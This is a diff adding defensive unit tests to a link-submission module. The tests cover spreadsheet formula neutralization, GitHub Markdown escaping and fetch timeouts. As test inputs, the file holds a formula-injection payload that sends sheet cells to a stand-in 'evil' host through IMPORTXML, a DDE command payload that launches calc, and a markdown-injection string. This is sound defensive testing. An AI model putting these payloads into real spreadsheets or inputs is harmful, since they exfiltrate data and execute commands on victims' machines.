@@ -4,12 +4,27 @@ import {
   domainFromUrl,
   platformGuessFromDomain,
   hashClientId,
+  neutralizeCell,
+  escGithubCodeSpan,
   postGitHubIssue,
   postToSheet,
   sendSubmissionEmail,
   submitLink,
   type SubmissionRecord,
 } from './submit-link';
+
+/** A fetch mock whose promise only settles when the AbortController's signal
+ * fires — mirrors how real `fetch` behaves against an AbortSignal, without
+ * waiting out a real network hang. Use with fake timers. */
+function neverRespondingFetch() {
+  return vi.fn((_url: string, init?: RequestInit) => {
+    return new Promise((_resolve, reject) => {
+      init?.signal?.addEventListener('abort', () => {
+        reject(new DOMException('The operation was aborted.', 'AbortError'));
+      });
+    });
+  });
+}
 
 afterEach(() => {
   vi.unstubAllEnvs();
@@ -89,6 +104,36 @@ describe('hashClientId', () => {
   });
 });
 
+describe('neutralizeCell', () => {
+  it.each(['=IMPORTXML("http://evil/?"&JOIN(",",A1:A9),"//a")', '+1+1', '-1', '@SUM(A1)'])(
+    'prefixes a leading formula-triggering character with a single quote: %s',
+    (value) => {
+      expect(neutralizeCell(value)).toBe(`'${value}`);
+    },
+  );
+
+  it('leaves ordinary values untouched', () => {
+    expect(neutralizeCell('https://reddit.com/r/TaylorSwift')).toBe('https://reddit.com/r/TaylorSwift');
+    expect(neutralizeCell('community')).toBe('community');
+    expect(neutralizeCell('')).toBe('');
+  });
+});
+
+describe('escGithubCodeSpan', () => {
+  it('replaces backticks so a value cannot close its enclosing code span', () => {
+    const result = escGithubCodeSpan('` and now markdown **outside** the span');
+    expect(result).not.toContain('`');
+  });
+
+  it('collapses newlines so a value cannot break out of its bullet line', () => {
+    expect(escGithubCodeSpan('line one\nline two\r\nline three')).toBe('line one line two line three');
+  });
+
+  it('leaves ordinary values untouched', () => {
+    expect(escGithubCodeSpan('reddit.com')).toBe('reddit.com');
+  });
+});
+
 const baseRecord: SubmissionRecord = {
   url: 'https://reddit.com/r/TaylorSwift',
   domain: 'reddit.com',
@@ -129,6 +174,40 @@ describe('postGitHubIssue', () => {
     const res = await postGitHubIssue(baseRecord);
     expect(res).toEqual({ attempted: true, ok: false });
   });
+
+  it('escapes a backtick in a record field instead of letting it break out of its code span', async () => {
+    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
+    const fetchSpy = vi.fn().mockResolvedValue(
+      new Response(JSON.stringify({ number: 8, html_url: 'http://gh/8' }), { status: 201 }),
+    );
+    vi.stubGlobal('fetch', fetchSpy);
+
+    const malicious: SubmissionRecord = {
+      ...baseRecord,
+      sourcePage: '` **injected markdown** `',
+    };
+    await postGitHubIssue(malicious);
+
+    const [, init] = fetchSpy.mock.calls[0];
+    const sent = JSON.parse(init.body as string);
+    // The body still contains exactly two literal backticks per field line
+    // (the wrapping pair) — none of the injected backticks survived.
+    const fromPageLine = sent.body.split('\n').find((l: string) => l.includes('From page'));
+    expect((fromPageLine.match(/`/g) || []).length).toBe(2);
+  });
+
+  it('does not hang the caller when the GitHub fetch never resolves', async () => {
+    vi.useFakeTimers();
+    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
+    vi.stubGlobal('fetch', neverRespondingFetch());
+
+    const promise = postGitHubIssue(baseRecord);
+    await vi.advanceTimersByTimeAsync(5100);
+    const res = await promise;
+
+    expect(res).toEqual({ attempted: true, ok: false });
+    vi.useRealTimers();
+  });
 });
 
 describe('postToSheet', () => {
@@ -154,6 +233,43 @@ describe('postToSheet', () => {
     vi.stubGlobal('fetch', vi.fn().mockRejectedValue(new Error('timeout')));
     const res = await postToSheet(baseRecord);
     expect(res).toEqual({ attempted: true, ok: false });
+  });
+
+  it('neutralizes every outgoing cell that could be interpreted as a formula', async () => {
+    vi.stubEnv('SUBMISSIONS_SHEET_WEBHOOK_URL', 'https://script.google.com/hook');
+    const fetchSpy = vi.fn().mockResolvedValue(new Response('{}', { status: 200 }));
+    vi.stubGlobal('fetch', fetchSpy);
+
+    // A record whose fields carry formula-triggering leading characters —
+    // simulates whichever field a future change makes user-writable, per
+    // the finding's "regardless of which field" requirement.
+    const malicious: SubmissionRecord = {
+      ...baseRecord,
+      domain: '=IMPORTXML("http://evil/?"&JOIN(",",A1:A9),"//a")',
+      sourcePage: '+cmd|"/c calc"!A1',
+    };
+    await postToSheet(malicious);
+
+    const [, init] = fetchSpy.mock.calls[0];
+    const sent = JSON.parse(init.body as string);
+    expect(sent.domain).toBe(`'${malicious.domain}`);
+    expect(sent.source_page).toBe(`'${malicious.sourcePage}`);
+    // Ordinary fields are untouched.
+    expect(sent.url).toBe(baseRecord.url);
+    expect(sent.section).toBe(baseRecord.section);
+  });
+
+  it('does not hang the caller when the sheet webhook never resolves', async () => {
+    vi.useFakeTimers();
+    vi.stubEnv('SUBMISSIONS_SHEET_WEBHOOK_URL', 'https://script.google.com/hook');
+    vi.stubGlobal('fetch', neverRespondingFetch());
+
+    const promise = postToSheet(baseRecord);
+    await vi.advanceTimersByTimeAsync(5100);
+    const res = await promise;
+
+    expect(res).toEqual({ attempted: true, ok: false });
+    vi.useRealTimers();
   });
 });
 
@@ -187,6 +303,20 @@ describe('sendSubmissionEmail', () => {
     const sent = JSON.parse(init.body as string);
     expect(sent.to).toEqual(['sffan15@gmail.com']);
   });
+
+  it('does not hang the caller when the Resend fetch never resolves', async () => {
+    vi.useFakeTimers();
+    vi.stubEnv('RESEND_API_KEY', 'key');
+    vi.stubEnv('SUBMISSIONS_EMAIL_FROM', 'submissions@longlivets.com');
+    vi.stubGlobal('fetch', neverRespondingFetch());
+
+    const promise = sendSubmissionEmail(baseRecord);
+    await vi.advanceTimersByTimeAsync(5100);
+    const res = await promise;
+
+    expect(res).toEqual({ attempted: true, ok: false });
+    vi.useRealTimers();
+  });
 });
 
 describe('submitLink', () => {
@@ -196,5 +326,18 @@ describe('submitLink', () => {
     expect(outcome.githubIssue.attempted).toBe(false);
     expect(outcome.sheet.attempted).toBe(false);
     expect(outcome.email.attempted).toBe(false);
+  });
+
+  it('still resolves within the timeout even when the always-on GitHub sink hangs', async () => {
+    vi.useFakeTimers();
+    vi.stubEnv('GITHUB_FEEDBACK_TOKEN', 'token');
+    vi.stubGlobal('fetch', neverRespondingFetch());
+
+    const promise = submitLink(baseRecord);
+    await vi.advanceTimersByTimeAsync(5100);
+    const outcome = await promise;
+
+    expect(outcome.githubIssue).toEqual({ attempted: true, ok: false });
+    vi.useRealTimers();
   });
 });
